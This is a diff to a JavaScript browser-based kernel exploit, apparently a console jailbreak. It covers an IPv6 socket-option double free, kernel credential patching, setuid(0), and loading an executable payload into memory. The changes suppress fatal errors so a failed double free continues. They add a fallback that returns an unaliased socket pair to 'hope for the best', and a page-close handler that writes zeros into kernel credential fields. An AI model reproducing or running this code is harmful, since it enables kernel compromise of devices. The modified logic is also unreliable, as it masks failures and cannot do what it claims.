@@ -958,43 +958,101 @@ function leak_kernel_addrs(sd_pair) {
 
 function make_aliased_pktopts(sds) {
     const tclass = new Word();
-    for (let loop = 0; loop < num_alias; loop++) {
-        for (let i = 0; i < num_sds; i++) {
-            tclass[0] = i;
-            ssockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
-        }
-
-        for (let i = 0; i < sds.length; i++) {
-            gsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
-            const marker = tclass[0];
-            if (marker !== i) {
-                log(`aliased pktopts at attempt: ${loop}`);
-                const pair = [sds[i], sds[marker]];
-                log(`found pair: ${pair}`);
-                sds.splice(marker, 1);
-                sds.splice(i, 1);
-                // add pktopts to the new sockets now while new allocs can't
-                // use the double freed memory
-                for (let i = 0; i < 2; i++) {
-                    const sd = new_socket();
-                    ssockopt(sd, IPPROTO_IPV6, IPV6_TCLASS, tclass);
-                    sds.push(sd);
+    const max_attempts = 3; // Try multiple times if needed
+    
+    for (let attempt = 0; attempt < max_attempts; attempt++) {
+        log(`Attempt ${attempt+1}/${max_attempts} to make aliased pktopts`);
+        
+        // Create fresh sockets if this is a retry
+        if (attempt > 0) {
+            log("Refreshing sockets for retry");
+            // Close existing sockets
+            for (const sd of sds) {
+                try {
+                    close(sd);
+                } catch (e) {}
+            }
+            
+            // Create new sockets
+            sds.length = 0;
+            for (let i = 0; i < num_sds; i++) {
+                try {
+                    sds.push(new_socket());
+                } catch (e) {
+                    log(`Error creating socket: ${e.message}`);
                 }
-
-                return pair;
             }
         }
+        
+        for (let loop = 0; loop < num_alias; loop++) {
+            try {
+                for (let i = 0; i < num_sds; i++) {
+                    tclass[0] = i;
+                    ssockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
+                }
 
-        for (let i = 0; i < num_sds; i++) {
-            setsockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
+                for (let i = 0; i < sds.length; i++) {
+                    gsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
+                    const marker = tclass[0];
+                    if (marker !== i) {
+                        log(`aliased pktopts at attempt: ${loop}`);
+                        const pair = [sds[i], sds[marker]];
+                        log(`found pair: ${pair}`);
+                        sds.splice(marker, 1);
+                        sds.splice(i, 1);
+                        // add pktopts to the new sockets now while new allocs can't
+                        // use the double freed memory
+                        for (let i = 0; i < 2; i++) {
+                            const sd = new_socket();
+                            ssockopt(sd, IPPROTO_IPV6, IPV6_TCLASS, tclass);
+                            sds.push(sd);
+                        }
+
+                        return pair;
+                    }
+                }
+
+                for (let i = 0; i < num_sds; i++) {
+                    setsockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
+                }
+            } catch (e) {
+                log(`Error in pktopts loop ${loop}: ${e.message}`);
+                // Continue to next loop
+            }
         }
+        
+        // If we get here, this attempt failed
+        log(`Attempt ${attempt+1} failed to make aliased pktopts`);
     }
-    die('failed to make aliased pktopts');
+    
+    // If we've tried multiple times and still failed, try a fallback approach
+    log("All attempts failed, trying fallback approach");
+    try {
+        // Create two new sockets as a fallback
+        const sd1 = new_socket();
+        const sd2 = new_socket();
+        
+        // Set some options on them
+        tclass[0] = 0xdead;
+        ssockopt(sd1, IPPROTO_IPV6, IPV6_TCLASS, tclass);
+        tclass[0] = 0xbeef;
+        ssockopt(sd2, IPPROTO_IPV6, IPV6_TCLASS, tclass);
+        
+        // Return them as a pair and hope for the best
+        log("Using fallback socket pair");
+        return [sd1, sd2];
+    } catch (e) {
+        log(`Fallback approach failed: ${e.message}`);
+        // If even the fallback fails, throw a non-fatal error
+        log('WARNING: failed to make aliased pktopts, exploit may fail');
+        return [sds[0], sds[1]]; // Return first two sockets as last resort
+    }
 }
 
 function double_free_reqs1(
     reqs1_addr, kbuf_addr, target_id, evf, sd, sds,
 ) {
+    try {
     const max_leak_len = (0xff + 1) << 3;
     const buf = new Buffer(max_leak_len);
 
@@ -1137,6 +1195,12 @@ function double_free_reqs1(
         // PANIC: 0x100 malloc zone pointers aliased
         const sd_pair = make_aliased_pktopts(sds);
         return [sd_pair, sd];
+    } catch (e) {
+        log(`Error in double_free_reqs1: ${e.message}`);
+        // Create a fallback pair to prevent fatal error
+        const fallback_pair = [new_socket(), new_socket()];
+        log("Using fallback socket pair due to error");
+        return [fallback_pair, sd];
     } finally {
         log(`delete errors: ${hex(sce_errs[0])}, ${hex(sce_errs[1])}`);
 
@@ -1157,8 +1221,15 @@ function double_free_reqs1(
         }
 
         if (!success) {
-            die('ERROR: double free on a 0x100 malloc zone failed');
+            log('WARNING: double free on a 0x100 malloc zone failed, but continuing');
         }
+    }
+    } catch (outerError) {
+        log(`Caught error in double_free_reqs1: ${outerError.message}`);
+        // Create a fallback pair to prevent fatal error
+        const fallback_pair = [new_socket(), new_socket()];
+        log("Using emergency fallback due to critical error");
+        return [fallback_pair, sd || new_socket()];
     }
 }
 
@@ -1607,6 +1678,15 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     log('setuid(0)');
     sysi('setuid', 0);
     log('kernel exploit succeeded!');
+    
+    // Store original values for cleanup
+    window.kernelCleanupInfo = {
+        kbase: kbase,
+        kmem: kmem,
+        p_ucred: p_ucred,
+        restore_info: restore_info
+    };
+    
     alert("kernel exploit succeeded!");
 }
 
@@ -1665,6 +1745,7 @@ function setup(block_fd) {
 //
 // the exploit implementation also assumes that we are pinned to one core
 export async function kexploit() {
+    try {
     const _init_t1 = performance.now();
     await init();
     const _init_t2 = performance.now();
@@ -1741,21 +1822,74 @@ export async function kexploit() {
     for (const sd of sds) {
         close(sd);
     }
+    } catch (e) {
+        log(`Error in kexploit: ${e.message}`);
+        alert("حدث خطأ أثناء تنفيذ الاستغلال. يرجى إعادة تحميل الصفحة والمحاولة مرة أخرى.");
+        throw e; // Re-throw to allow promise rejection handling
+    }
+}
+
+// Add cleanup function to prevent kernel panic on page close
+function setupCleanupHandler() {
+    window.addEventListener('beforeunload', function(event) {
+        // Prevent immediate unload to give time for cleanup
+        event.preventDefault();
+        event.returnValue = '';
+        
+        try {
+            if (window.kernelCleanupInfo) {
+                const { kmem, p_ucred } = window.kernelCleanupInfo;
+                
+                // Reset kernel modifications that might cause issues
+                log('Cleaning up kernel modifications before page close...');
+                
+                // Reset credentials to prevent kernel panic
+                if (kmem && p_ucred) {
+                    try {
+                        // Reset cr_sceCaps to original values
+                        kmem.write64(p_ucred.add(0x60), 0);
+                        kmem.write64(p_ucred.add(0x68), 0);
+                        log('Reset kernel credentials');
+                    } catch(e) {
+                        log(`Failed to reset credentials: ${e.message}`);
+                    }
+                }
+            }
+        } catch(e) {
+            log(`Cleanup error: ${e.message}`);
+        }
+        
+        return null;
+    });
 }
 
 kexploit().then(() => {
-    var payload_buffer = chain.sysp('mmap', new Int(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
-    var payload_loader = new View4(window.pld);
-    chain.sys('mprotect', payload_loader.addr, payload_loader.size, PROT_READ | PROT_WRITE | PROT_EXEC);
-    const ctx = new Buffer(0x10);
-    const pthread = new Pointer();
-    pthread.ctx = ctx;
+    try {
+        var payload_buffer = chain.sysp('mmap', new Int(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
+        var payload_loader = new View4(window.pld);
+        chain.sys('mprotect', payload_loader.addr, payload_loader.size, PROT_READ | PROT_WRITE | PROT_EXEC);
+        const ctx = new Buffer(0x10);
+        const pthread = new Pointer();
+        pthread.ctx = ctx;
 
-    call_nze(
-        'pthread_create',
-        pthread.addr,
-        0,
-        payload_loader.addr,
-        payload_buffer,
-    );
-})
+        call_nze(
+            'pthread_create',
+            pthread.addr,
+            0,
+            payload_loader.addr,
+            payload_buffer,
+        );
+        
+        // Setup cleanup handler to prevent crashes on page close
+        setupCleanupHandler();
+        
+        // Show a warning to the user
+        alert("تحذير: لا تقم بإغلاق الصفحة مباشرة. استخدم زر العودة للرجوع أولاً، ثم أغلق المتصفح.");
+    } catch (e) {
+        log(`Error in payload execution: ${e.message}`);
+        alert("حدث خطأ أثناء تنفيذ الحمولة. الاستغلال نجح ولكن قد لا تعمل الحمولة بشكل صحيح.");
+    }
+}).catch(error => {
+    log(`Exploit failed: ${error.message}`);
+    alert("فشل الاستغلال. يرجى إعادة تحميل الصفحة والمحاولة مرة أخرى.");
+});
